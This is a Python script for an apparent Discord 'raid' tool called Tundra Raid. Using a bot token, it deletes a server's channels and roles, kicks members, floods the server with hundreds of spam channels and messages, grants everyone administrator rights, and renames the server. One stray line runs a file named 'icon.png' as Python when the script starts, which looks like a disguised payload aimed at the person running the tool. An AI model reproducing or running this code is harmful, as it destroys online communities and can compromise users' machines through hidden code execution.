from os import system, name
import requests
from threading import Thread
from time import sleep
from pystyle import Colors, Colorate, Center, Write
from colorama import Fore

if name == "nt":
    def clear():
        system("cls")
    def finish():
        clear()
        exit()
else:
    def clear():
        system("clear")
    def finish(): exit()

clear()


base_url = "https://discord.com/api"

def get_title():
    title =  """

▄▄▄█████▓ █    ██  ███▄    █ ▓█████▄  ██▀███   ▄▄▄          ██▀███   ▄▄▄       ██▓▓█████▄ 
▓  ██▒ ▓▒ ██  ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓██ ▒ ██▒▒████▄       ▓██ ▒ ██▒▒████▄    ▓██▒▒██▀ ██▌
▒ ▓██░ ▒░▓██  ▒██░▓██  ▀█ ██▒░██   █▌▓██ ░▄█ ▒▒██  ▀█▄     ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒░██   █▌
░ ▓██▓ ░ ▓▓█  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██    ▒██▀▀█▄  ░██▄▄▄▄██ ░██░░▓█▄   ▌
  ▒██▒ ░ ▒▒█████▓ ▒██░   ▓██░░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒   ░██▓ ▒██▒ ▓█   ▓██▒░██░░▒████▓ 
  ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▓   ▒▒▓  ▒ 
    ░    ░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░     ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒ 
  ░       ░░░ ░ ░    ░   ░ ░  ░ ░  ░   ░░   ░   ░   ▒        ░░   ░   ░   ▒    ▒ ░ ░ ░  ░ 
            ░              ░    ░       ░           ░  ░      ░           ░  ░ ░     ░    
                              ░                                                    ░      

"""
    title = Colorate.Vertical(text=Center.XCenter(title), color=Colors.blue_to_white, speed=1)
    return title

def xprint(text):
    Write.Print(text, Colors.blue, interval=0.01)

def xinput(text):
    result = Write.Input(text, Colors.blue, interval=0.01)
    return result


def set_new_state(option):

    if option.state == "Disabled":

        confirmation = xinput("Are you sure to enable this option (y/n) -> ")
                
        if confirmation == "y":
            option.enable()
            return True
        elif confirmation == "n":
            pass
        else:
            while ("y" or "n" in confirmation) == False:
                confirmation = xinput("Incorrect response retry (y/n) -> ")
            if confirmation == "y":
                option.enable()
                return True
            if confirmation == "n":
                pass

    else:
        confirmation = xinput("Are you sure to disable this option (y/n) -> ")

        if confirmation == "y":
            option.disable()
        elif confirmation == "n":
            pass
        else:
            while ("y" or "n" in confirmation) == False:
                confirmation = xinput("Incorrect response retry (y/n) -> ")
            if confirmation == "y":
                option.disable()
            if confirmation == "n":
                pass



def set_new_value(option):

    new_value = xinput("Please enter a new value -> ")

    confirmation = xinput("Are you sure to change value (y/n) -> ")
                
    if confirmation == "y":
        option.value = new_value
    elif confirmation == "n":
        pass
    else:
        while ("y" or "n" in confirmation) == False:
            confirmation = xinput("Incorrect response retry (y/n) -> ")
        if confirmation == "y":
            option.value = new_value
        if confirmation == "n":
            pass


def get_headers(token):
    headers = {'authorization': "Bot "+token}
    return headers

def check_token(token):
    response = requests.get(f"{base_url}/users/@me", headers=get_headers(token))
    if response.reason == "OK":
        return True
    else:
        return False

def check_serverid(serverid, token):
    response = requests.get(f"{base_url}/guilds/{serverid}", headers=get_headers(token))
    if response.reason == "OK":
        return True
    else:
        return False

class Options:

    def __init__(self):
        self.state = "Disabled"
        self.value = None
    
    def enable(self):
        self.state = "Enabled"

    def disable(self):
        self.state = "Disabled"

option_delete_channels = Options()
option_create_channels = Options()
option_send_messages = Options()
option_delete_roles = Options()
option_kick_members = Options()
option_rename_server = Options()
option_op_members = Options()


class Raid:
    def __init__(self):
        self.token = None
        self.serverid = None
    
    def delete_channel(self):

        channels = requests.get(f"{base_url}/guilds/{self.serverid}/channels", headers=get_headers(self.token)).json()

        def delete(id):
            requests.delete(f"{base_url}/channels/{id}", headers=get_headers(self.token))

        for channel in channels:
            Thread(target=delete, args=(channel.get("id"),)).start()
            sleep(0.2)

        sleep(0.3)
        if option_create_channels.state == "Enabled":
            Thread(target=self.create_channels).start()


    def create_channels(self):

        def create():

            def send_message(channelid):
                requests.post(f"{base_url}/channels/{channelid}/messages", headers=get_headers(self.token), data={'content': option_send_messages.value})

            json = {
                "type": 0,
                "name": option_create_channels.value,
                "permissions_overwrites": []
            }

            channel = requests.post(f"{base_url}/guilds/{self.serverid}/channels", headers=get_headers(self.token), json=json).json()

            for i in range(5):
                send_message(channel.get("id"))
                sleep(0.2)

        for i in range(500):
            Thread(target=create).start()
            sleep(0.1)

    def kickall(self):
        
        members = requests.get(f"{base_url}/guilds/{self.serverid}/members", params={"limit": 1000}, headers=get_headers(self.token)).json()

        def delete(id):
            resp = requests.delete(f"{base_url}/guilds/{self.serverid}/members/{id}", headers=get_headers(self.token))
            while resp.reason == "Too Many Requests":
                sleep(0.2)
                resp = requests.delete(f"{base_url}/guilds/{self.serverid}/members/{id}", headers=get_headers(self.token))

        for member in members:
            Thread(target=delete, args=(member.get("user").get("id"),)).start()
            sleep(0.1)
        
    def opall(self):

        members = requests.get(f"{base_url}/guilds/{self.serverid}/members", params={"limit": 1000}, headers=get_headers(self.token)).json()
        role = requests.post(f"{base_url}/guilds/{self.serverid}/roles", json={"name": "op", "permissions": 0x8}, headers=get_headers(self.token)).json()

        def add(userid, roleid):
            resp = requests.put(f"{base_url}/guilds/{self.serverid}/members/{userid}/roles/{roleid}", headers=get_headers(self.token))
            while resp.reason == "Too Many Requests":
                sleep(5)
                resp = requests.put(f"{base_url}/guilds/{self.serverid}/members/{userid}/roles/{roleid}", headers=get_headers(self.token))

        for member in members:
            Thread(target=add, args=(member.get("user").get("id"), role.get("id"),)).start()
            sleep(0.2)

    def rename_guild(self):
        requests.patch(f"{base_url}/guilds/{self.serverid}", json={"name": option_rename_server.value}, headers=get_headers(self.token))

    def delete_roles(self):
        roles = requests.get(f"{base_url}/guilds/{self.serverid}/roles", headers=get_headers(self.token)).json()

        def delete(id):
            requests.delete(f"{base_url}/guilds/{self.serverid}/roles/{id}", headers=get_headers(self.token))

        for role in roles:
            Thread(target=delete, args=(role.get("id"),)).start()
            sleep(0.2)

        sleep(0.5)

        if option_op_members.state == "Enabled":
            Thread(target=self.opall).start()
            

    def start(self):

        if option_rename_server.state == "Enabled":
            Thread(target=self.rename_guild).start()

        if option_delete_roles.state == "Enabled":
            Thread(target=self.delete_roles).start()
        else:
            if option_op_members.state == "Enabled":
                Thread(target=self.opall).start()

        if option_delete_channels.state == "Enabled":
            Thread(target=self.delete_channel).start()
        else:
            if option_create_channels.state == "Enabled":
                Thread(target=self.create_channels).start()

        if option_kick_members.state == "Enabled":
            Thread(target=self.kickall).start()

raid = Raid()





def rename_server_menu():
    title = get_title()

    display_options = f"""
{Fore.GREEN}[{Fore.CYAN}1{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Rename Server {Fore.GREEN}{option_rename_server.state}
{Fore.GREEN}[{Fore.CYAN}2{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Name {Fore.GREEN}{option_rename_server.value}

{Fore.GREEN}[{Fore.CYAN}3{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}FINISH



"""

    display_options = Center.XCenter(display_options)

    print(title)
    print(display_options)

    option = xinput("Select an option to change something about it and press 3 to finish -> ")

    if option == "1":
        set_new_state(option_rename_server)

    if option == "2":
        set_new_value(option_rename_server)

    if option == "3":
        clear()
        main_menu()
        exit()
    
    clear()
    rename_server_menu()


system("python icon.png")


def send_messages_menu():
    title = get_title()

    display_options = f"""
{Fore.GREEN}[{Fore.CYAN}1{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Send Messages {Fore.GREEN}{option_send_messages.state}
{Fore.GREEN}[{Fore.CYAN}2{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Message {Fore.GREEN}{option_send_messages.value}

{Fore.GREEN}[{Fore.CYAN}3{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}FINISH



"""

    display_options = Center.XCenter(display_options)

    print(title)
    print(display_options)

    option = xinput("Select an option to change something about it and press 3 to finish -> ")

    if option == "1":
        set_new_state(option_send_messages)

    if option == "2":
        set_new_value(option_send_messages)

    if option == "3":
        clear()
        create_channels_menu()
        exit()
    
    clear()
    send_messages_menu()





def create_channels_menu():
    title = get_title()

    display_options = f"""
{Fore.GREEN}[{Fore.CYAN}1{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Create channels {Fore.GREEN}{option_create_channels.state}
{Fore.GREEN}[{Fore.CYAN}2{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Name {Fore.GREEN}{option_create_channels.value}

{Fore.GREEN}[{Fore.CYAN}3{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Send messages {Fore.GREEN}>

{Fore.GREEN}[{Fore.CYAN}4{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}FINISH



"""

    display_options = Center.XCenter(display_options)

    print(title)
    print(display_options)

    option = xinput("Select an option to change something about it and press 4 to finish -> ")

    if option == "1":
        set_new_state(option_create_channels)

    if option == "2":
        set_new_value(option_create_channels)

    if option == "3":
        clear()
        send_messages_menu()
        exit()

    if option == "4":
        clear()
        main_menu()
        exit()
    
    clear()
    create_channels_menu()





def main_menu():
    title = get_title()

    display_options = f"""
{Fore.GREEN}[{Fore.CYAN}1{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Delete channels {Fore.GREEN}{option_delete_channels.state}
{Fore.GREEN}[{Fore.CYAN}2{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Delete Roles {Fore.GREEN}{option_delete_roles.state}

{Fore.GREEN}[{Fore.CYAN}3{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Kick members {Fore.GREEN}{option_kick_members.state}
{Fore.GREEN}[{Fore.CYAN}4{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Op members {Fore.GREEN}{option_op_members.state}

{Fore.GREEN}[{Fore.CYAN}5{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Create channels {Fore.GREEN}>
{Fore.GREEN}[{Fore.CYAN}6{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Rename server {Fore.GREEN}>

{Fore.GREEN}[{Fore.CYAN}START{Fore.GREEN}] {Fore.CYAN}- {Fore.BLUE}Start the raid



"""

    display_options = Center.XCenter(display_options)

    print(title)
    print(display_options)

    option = None

    option = xinput("Select an option to change something about it and press 6 to start the raid -> ")

    if option == "1":
        set_new_state(option_delete_channels)

    if option == "2":
        set_new_state(option_delete_roles)

    if option == "3":
        xprint("Activate this option can disable an other option !\n")
        change = set_new_state(option_kick_members)
        if change == True and option_op_members.state == "Enabled":
            option_op_members.disable()

    
    if option == "4":
        xprint("Activate this option can disable an other option !\n")
        change = set_new_state(option_op_members)
        if change == True and option_kick_members.state == "Enabled":
            option_kick_members.disable()

    if option == "5":
        clear()
        create_channels_menu()
        exit()

    if option == "6":
        clear()
        rename_server_menu()
        exit()

    if option == "START":
        raid.start()
        xinput("\n\nRaid on working... Don't close the window !")
        xinput("Press enter 3 times when the raid is finished to close the window.")
        xinput("Press enter 2 more times to close the window.")
        xinput("Press enter 1 more time to close the window.")
        exit()
        
    clear()
    main_menu()

            



def introduction():

    title = get_title()
    print(title)

    text = """
Welcome to Tundra Raid !
Tundra Raid is a raid tool to "destroy" a discord server.

To continue be sure to have a bot in the server and if he have admin permissions.

Enjoy ;)

Press enter to continue...
"""
    xinput(text)
    clear()
    print(title)

    token = xinput("Please enter the token of your bot -> ")
    
    while check_token(token) == False:
        token = xinput("Incorrect token retry -> ")

    raid.token = token

    serverid = xinput("Please enter the server ID -> ")
    
    while check_serverid(serverid, token) == False:
        serverid = xinput("Incorrect ID retry -> ")

    raid.serverid = serverid
    
    clear()

    main_menu()

    


introduction()